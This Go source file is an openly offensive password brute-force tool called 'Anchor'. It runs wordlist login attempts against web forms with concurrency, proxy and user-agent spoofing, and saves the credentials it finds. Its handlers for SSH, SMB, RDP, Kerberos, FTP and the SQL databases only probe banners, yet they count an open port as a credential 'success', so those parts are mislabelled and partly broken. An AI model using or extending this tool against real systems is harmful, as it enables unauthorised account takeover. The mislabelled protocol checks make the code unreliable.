package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	ATTACK_SUCCESS             = 0
	ATTACK_FAIL                = 1
	ATTACK_TIMEOUT             = 2
	ATTACK_CONNECTION_REFUSED  = 3
	ATTACK_INVALID_CREDENTIALS = 4
	ATTACK_SOCKET_ERROR        = 5
	ATTACK_PROTOCOL_ERROR      = 6
	ATTACK_RATE_LIMITED        = 7
	ATTACK_AUTH_REQUIRED       = 8
)

// Anchor configuration
type Config struct {
	Target         string
	Username       string
	PasswordFile   string
	Protocol       string
	Port           int
	Timeout        int
	Concurrency    int
	ContinueOnFail bool
	Verbose        bool
	OutputFile     string
	Proxy          string
	Delay          int
	MaxRetries     int
	UserAgent      string
	CookieFile     string
	FormAction     string
	SuccessString  string
	FailString     string
	Method         string
	Headers        string
}

// Anchor statistics
type AttackStats struct {
	Total          int64
	Success        int64
	Failed         int64
	Timeout        int64
	Refused        int64
	Invalid        int64
	SocketErr      int64
	ProtoErr       int64
	RateLimited    int64
	FoundPasswords []string
	mu             sync.Mutex
}

type CredentialJob struct {
	Username string
	Password string
	Index    int
}

var passwords []string
var startTime time.Time

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	config := parseFlags()

	// Load wordlist
	var err error
	passwords, err = loadWordlist(config.PasswordFile)
	if err != nil {
		fmt.Printf("Error loading wordlist: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Anchor v2.0 - Starting attack on %s with %d passwords and %d workers\n",
		httpDisplayURL(config), len(passwords), config.Concurrency)
	fmt.Printf("Mode: %s\n", getModeDescription(config))
	fmt.Println("Press Ctrl+C to stop")

	stats := &AttackStats{
		FoundPasswords: make([]string, 0),
	}
	startTime = time.Now()

	jobChan := make(chan CredentialJob, config.Concurrency*2)
	resultsChan := make(chan int, config.Concurrency*2)

	var wg sync.WaitGroup
	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go worker(config, jobChan, resultsChan, stats, &wg)
	}

	go func() {
		for i, password := range passwords {
			jobChan <- CredentialJob{
				Username: config.Username,
				Password: password,
				Index:    i,
			}
		}
		close(jobChan)
	}()

	go func() {
		wg.Wait()
		close(resultsChan)
	}()

	// Progress reporter
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		for range ticker.C {
			if config.Verbose {
				total := atomic.LoadInt64(&stats.Total)
				if total > 0 {
					progress := float64(total) / float64(len(passwords)) * 100
					fmt.Printf("\rProgress: %.1f%% | Attempts: %d | Found: %d | Rate: %.1f/s",
						progress, total, len(stats.FoundPasswords),
						float64(total)/time.Since(startTime).Seconds())
				}
			}
		}
	}()

	// Process results
	for result := range resultsChan {
		atomic.AddInt64(&stats.Total, 1)
		switch result {
		case ATTACK_SUCCESS:
			atomic.AddInt64(&stats.Success, 1)
		case ATTACK_TIMEOUT:
			atomic.AddInt64(&stats.Timeout, 1)
		case ATTACK_CONNECTION_REFUSED:
			atomic.AddInt64(&stats.Refused, 1)
		case ATTACK_INVALID_CREDENTIALS:
			atomic.AddInt64(&stats.Invalid, 1)
		case ATTACK_SOCKET_ERROR:
			atomic.AddInt64(&stats.SocketErr, 1)
		case ATTACK_PROTOCOL_ERROR:
			atomic.AddInt64(&stats.ProtoErr, 1)
		case ATTACK_RATE_LIMITED:
			atomic.AddInt64(&stats.RateLimited, 1)
		default:
			atomic.AddInt64(&stats.Failed, 1)
		}
	}

	elapsed := time.Since(startTime)
	printStats(stats, elapsed)

	// Save results if output file specified
	if config.OutputFile != "" {
		saveResults(stats, config.OutputFile)
	}
}

func parseFlags() Config {
	var config Config
	flag.StringVar(&config.Target, "target", "", "Target IP, hostname, or URL (e.g., localhost:8080)")
	flag.StringVar(&config.Username, "username", "", "Username to test")
	flag.StringVar(&config.PasswordFile, "wordlist", "", "Path to password wordlist file")
	flag.StringVar(&config.Protocol, "protocol", "ssh", "Protocol: ssh, smb, rdp, http, https, kerberos, ftp, mysql, postgres, mssql")
	flag.IntVar(&config.Port, "port", 0, "Port (auto-detect if not specified)")
	flag.IntVar(&config.Timeout, "timeout", 5000, "Timeout in milliseconds")
	flag.IntVar(&config.Concurrency, "concurrency", 100, "Number of concurrent connections")
	flag.BoolVar(&config.ContinueOnFail, "continue", true, "Continue on failure")
	flag.BoolVar(&config.Verbose, "verbose", false, "Verbose output")
	flag.StringVar(&config.OutputFile, "output", "", "Output file for found credentials")
	flag.StringVar(&config.Proxy, "proxy", "", "Proxy server (e.g., http://proxy:8080)")
	flag.IntVar(&config.Delay, "delay", 0, "Delay between requests in milliseconds")
	flag.IntVar(&config.MaxRetries, "retries", 3, "Maximum retries on failure")
	flag.StringVar(&config.UserAgent, "user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "User-Agent string")
	flag.StringVar(&config.CookieFile, "cookies", "", "File containing cookies (Netscape format)")
	flag.StringVar(&config.FormAction, "form-action", "", "HTTP form action URL")
	flag.StringVar(&config.SuccessString, "success", "", "String indicating successful login")
	flag.StringVar(&config.FailString, "fail", "", "String indicating failed login")
	flag.StringVar(&config.Method, "method", "POST", "HTTP method (GET/POST)")
	flag.StringVar(&config.Headers, "headers", "", "Additional HTTP headers (key:value,key2:value2)")
	flag.Parse()

	if config.Target == "" || config.Username == "" || config.PasswordFile == "" {
		fmt.Println("Error: -target, -username, and -wordlist are required")
		flag.Usage()
		os.Exit(1)
	}

	// Auto-detect port if not specified
	if config.Port == 0 {
		switch config.Protocol {
		case "ssh":
			config.Port = 22
		case "smb":
			config.Port = 445
		case "rdp":
			config.Port = 3389
		case "kerberos":
			config.Port = 88
		case "http":
			config.Port = 80
		case "https":
			config.Port = 443
		case "ftp":
			config.Port = 21
		case "mysql":
			config.Port = 3306
		case "postgres":
			config.Port = 5432
		case "mssql":
			config.Port = 1433
		default:
			config.Port = 22
		}
	}

	return config
}

func getModeDescription(config Config) string {
	switch config.Protocol {
	case "http", "https":
		return "HTTP/HTTPS form authentication cracking"
	case "ssh":
		return "SSH service detection and banner grabbing"
	case "smb":
		return "SMB/CIFS service detection"
	case "rdp":
		return "RDP service detection"
	case "ftp":
		return "FTP service detection"
	case "mysql":
		return "MySQL service detection"
	case "postgres":
		return "PostgreSQL service detection"
	case "mssql":
		return "MSSQL service detection"
	default:
		return "Port scanning and service detection"
	}
}

func loadWordlist(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to open wordlist: %w", err)
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	buf := make([]byte, 0, 64*1024)
	scanner.Buffer(buf, 1024*1024)

	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password != "" {
			passwords = append(passwords, password)
		}
	}
	return passwords, scanner.Err()
}

func worker(config Config, jobs <-chan CredentialJob, results chan<- int, stats *AttackStats, wg *sync.WaitGroup) {
	defer wg.Done()

	for job := range jobs {
		// Add delay if configured
		if config.Delay > 0 {
			time.Sleep(time.Duration(config.Delay) * time.Millisecond)
		}

		result := performAttack(config, job)
		results <- result

		if result == ATTACK_SUCCESS {
			stats.mu.Lock()
			stats.FoundPasswords = append(stats.FoundPasswords, job.Password)
			stats.mu.Unlock()
			fmt.Printf("\n[ANCHOR] CREDENTIAL FOUND! %s:%s\n", job.Username, job.Password)
		}

		if result == ATTACK_SUCCESS && !config.ContinueOnFail {
			break
		}
	}
}

func performAttack(config Config, job CredentialJob) int {
	timeout := time.Duration(config.Timeout) * time.Millisecond

	// Check if we're dealing with HTTP/HTTPS (web form cracking)
	if config.Protocol == "http" || config.Protocol == "https" {
		return performHTTPAttack(config, job)
	}

	// For other protocols, try TCP connection
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", config.Target, config.Port), timeout)
	if err != nil {
		if err, ok := err.(net.Error); ok && err.Timeout() {
			return ATTACK_TIMEOUT
		}
		if strings.Contains(err.Error(), "refused") {
			return ATTACK_CONNECTION_REFUSED
		}
		return ATTACK_SOCKET_ERROR
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	switch config.Protocol {
	case "ssh":
		return performSSHCheck(conn)
	case "smb":
		return performSMBCheck(conn)
	case "rdp":
		return performRDPCheck(conn)
	case "kerberos":
		return performKerberosCheck(conn)
	case "ftp":
		return performFTPCheck(conn)
	case "mysql":
		return performMySQLCheck(conn)
	case "postgres":
		return performPostgresCheck(conn)
	case "mssql":
		return performMSSQLCheck(conn)
	default:
		return ATTACK_SUCCESS
	}
}

func httpDisplayURL(config Config) string {
	target := strings.TrimSpace(config.Target)
	if !strings.Contains(target, "://") {
		target = config.Protocol + "://" + target
	}
	parsed, err := url.Parse(target)
	if err != nil || parsed.Host == "" {
		return target
	}
	if parsed.Port() == "" && config.Port > 0 {
		parsed.Host = net.JoinHostPort(parsed.Hostname(), strconv.Itoa(config.Port))
	}
	return parsed.String()
}

func performHTTPAttack(config Config, job CredentialJob) int {
	timeout := time.Duration(config.Timeout) * time.Millisecond

	targetURL := httpDisplayURL(config)
	parsedTarget, err := url.Parse(targetURL)
	if err != nil || parsedTarget.Host == "" {
		return ATTACK_SOCKET_ERROR
	}
	baseURL := *parsedTarget
	if baseURL.Path == "" || baseURL.Path == "/" {
		baseURL.Path = "/login"
		baseURL.RawPath = ""
	}
	fullURL := baseURL.String()

	// Use form action if provided
	actionURL := config.FormAction
	if actionURL == "" {
		actionURL = fullURL
	} else if !strings.Contains(actionURL, "://") {
		actionURL = strings.TrimRight(targetURL, "/") + "/" + strings.TrimLeft(actionURL, "/")
	}

	// Build client
	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	if config.Proxy != "" {
		proxyURL, err := url.Parse(config.Proxy)
		if err == nil {
			client.Transport = &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			}
		}
	}

	// Build form data
	formData := url.Values{}
	formData.Set("username", job.Username)
	formData.Set("password", job.Password)
	formData.Set("login", "Login")
	formData.Set("submit", "Login")

	// Build request
	var req *http.Request

	if config.Method == "GET" {
		if strings.Contains(actionURL, "?") {
			actionURL += "&" + formData.Encode()
		} else {
			actionURL += "?" + formData.Encode()
		}
		req, err = http.NewRequest("GET", actionURL, nil)
	} else {
		req, err = http.NewRequest("POST", actionURL, strings.NewReader(formData.Encode()))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	}

	if err != nil {
		return ATTACK_SOCKET_ERROR
	}

	req.Header.Set("User-Agent", config.UserAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Connection", "close")

	// Custom headers
	if config.Headers != "" {
		headers := parseHeaders(config.Headers)
		for key, value := range headers {
			req.Header.Set(key, value)
		}
	}

	// Perform request with retries
	var resp *http.Response
	for attempt := 0; attempt <= config.MaxRetries; attempt++ {
		resp, err = client.Do(req)
		if err == nil {
			break
		}
		if attempt < config.MaxRetries {
			time.Sleep(100 * time.Millisecond)
		}
	}

	if err != nil {
		if strings.Contains(err.Error(), "timeout") {
			return ATTACK_TIMEOUT
		}
		if strings.Contains(err.Error(), "connection refused") {
			return ATTACK_CONNECTION_REFUSED
		}
		return ATTACK_SOCKET_ERROR
	}
	defer resp.Body.Close()

	// Check rate limiting
	if resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode == 429 {
		return ATTACK_RATE_LIMITED
	}

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	bodyStr := string(body)

	// Check for success
	success := false

	// Status code check
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		success = true
	}

	// Success string
	if config.SuccessString != "" && strings.Contains(bodyStr, config.SuccessString) {
		success = true
	}

	// Failure string
	if config.FailString != "" && strings.Contains(bodyStr, config.FailString) {
		success = false
	}

	// Redirect check
	if resp.StatusCode == 302 || resp.StatusCode == 303 {
		location := resp.Header.Get("Location")
		if location != "" && !strings.Contains(strings.ToLower(location), "login") {
			success = true
		}
	}

	// Success indicators
	successIndicators := []string{
		"dashboard", "welcome", "home", "profile",
		"logout", "signout", "admin", "panel",
	}
	for _, indicator := range successIndicators {
		if strings.Contains(strings.ToLower(bodyStr), indicator) {
			success = true
			break
		}
	}

	// Failure indicators
	failureIndicators := []string{
		"invalid", "incorrect", "failed", "error",
		"try again", "wrong", "denied",
	}
	for _, indicator := range failureIndicators {
		if strings.Contains(strings.ToLower(bodyStr), indicator) {
			success = false
			break
		}
	}

	if success {
		return ATTACK_SUCCESS
	}

	return ATTACK_INVALID_CREDENTIALS
}

func parseHeaders(headersStr string) map[string]string {
	headers := make(map[string]string)
	if headersStr == "" {
		return headers
	}

	pairs := strings.Split(headersStr, ",")
	for _, pair := range pairs {
		parts := strings.SplitN(pair, ":", 2)
		if len(parts) == 2 {
			headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	return headers
}

// Protocol detection functions
func performSSHCheck(conn net.Conn) int {
	_, err := conn.Write([]byte("SSH-2.0-OpenSSH_8.9p1\r\n"))
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	buf := make([]byte, 64)
	n, err := conn.Read(buf)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	if strings.HasPrefix(string(buf[:n]), "SSH-") {
		return ATTACK_SUCCESS
	}
	return ATTACK_PROTOCOL_ERROR
}

func performSMBCheck(conn net.Conn) int {
	smbHeader := []byte{0x00, 0x00, 0x00, 0x2F, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	_, err := conn.Write(smbHeader)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	buf := make([]byte, 128)
	n, err := conn.Read(buf)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	if n >= 8 && buf[4] == 0xFF && buf[5] == 0x53 && buf[6] == 0x4D && buf[7] == 0x42 {
		return ATTACK_SUCCESS
	}
	return ATTACK_PROTOCOL_ERROR
}

func performRDPCheck(conn net.Conn) int {
	rdpHeader := []byte{0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	_, err := conn.Write(rdpHeader)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	buf := make([]byte, 128)
	n, err := conn.Read(buf)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	if n >= 4 && buf[0] == 0x03 {
		return ATTACK_SUCCESS
	}
	return ATTACK_PROTOCOL_ERROR
}

func performKerberosCheck(conn net.Conn) int {
	kerberosHeader := []byte{0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	_, err := conn.Write(kerberosHeader)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	buf := make([]byte, 128)
	n, err := conn.Read(buf)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	if n >= 2 && buf[0] == 0x60 {
		return ATTACK_SUCCESS
	}
	return ATTACK_PROTOCOL_ERROR
}

func performFTPCheck(conn net.Conn) int {
	buf := make([]byte, 128)
	n, err := conn.Read(buf)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	if strings.Contains(string(buf[:n]), "220") {
		return ATTACK_SUCCESS
	}
	return ATTACK_PROTOCOL_ERROR
}

func performMySQLCheck(conn net.Conn) int {
	mysqlHeader := []byte{
		0x0A, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	_, err := conn.Write(mysqlHeader)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	buf := make([]byte, 128)
	n, err := conn.Read(buf)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	if n >= 4 && buf[0] == 0x0A {
		return ATTACK_SUCCESS
	}
	return ATTACK_PROTOCOL_ERROR
}

func performPostgresCheck(conn net.Conn) int {
	postgresHeader := []byte{
		0x00, 0x00, 0x00, 0x08, 0x04, 0xD2, 0x16, 0x2E,
	}
	_, err := conn.Write(postgresHeader)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	buf := make([]byte, 128)
	n, err := conn.Read(buf)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	if n >= 5 && buf[0] == 0x45 {
		return ATTACK_SUCCESS
	}
	return ATTACK_PROTOCOL_ERROR
}

func performMSSQLCheck(conn net.Conn) int {
	mssqlHeader := []byte{
		0x12, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	_, err := conn.Write(mssqlHeader)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	buf := make([]byte, 128)
	n, err := conn.Read(buf)
	if err != nil {
		return ATTACK_SOCKET_ERROR
	}
	if n >= 8 && buf[0] == 0x04 {
		return ATTACK_SUCCESS
	}
	return ATTACK_PROTOCOL_ERROR
}

func printStats(stats *AttackStats, elapsed time.Duration) {
	fmt.Printf("\n\n=== Anchor Attack Statistics ===\n")
	fmt.Printf("Total attempts:      %d\n", stats.Total)
	fmt.Printf("Credentials found:   %d\n", len(stats.FoundPasswords))
	fmt.Printf("Open ports:          %d\n", stats.Success)
	fmt.Printf("Closed ports:        %d\n", stats.Refused)
	fmt.Printf("Timeouts:            %d\n", stats.Timeout)
	fmt.Printf("Invalid credentials: %d\n", stats.Invalid)
	fmt.Printf("Socket errors:       %d\n", stats.SocketErr)
	fmt.Printf("Protocol errors:     %d\n", stats.ProtoErr)
	fmt.Printf("Rate limited:        %d\n", stats.RateLimited)
	fmt.Printf("Time elapsed:        %v\n", elapsed)
	if stats.Total > 0 {
		rate := float64(stats.Total) / elapsed.Seconds()
		fmt.Printf("Attempts/second:     %.2f\n", rate)
	}

	if len(stats.FoundPasswords) > 0 {
		fmt.Printf("\n=== Found Credentials ===\n")
		for i, password := range stats.FoundPasswords {
			fmt.Printf("%d. %s\n", i+1, password)
		}
	}
}

func saveResults(stats *AttackStats, outputFile string) {
	file, err := os.Create(outputFile)
	if err != nil {
		fmt.Printf("Error saving results: %v\n", err)
		return
	}
	defer file.Close()

	fmt.Fprintf(file, "=== Anchor Results ===\n")
	fmt.Fprintf(file, "Time: %s\n", time.Now().Format(time.RFC3339))
	fmt.Fprintf(file, "Total attempts: %d\n", stats.Total)
	fmt.Fprintf(file, "Credentials found: %d\n\n", len(stats.FoundPasswords))

	for i, password := range stats.FoundPasswords {
		fmt.Fprintf(file, "%d. %s\n", i+1, password)
	}

	fmt.Printf("Results saved to: %s\n", outputFile)
}
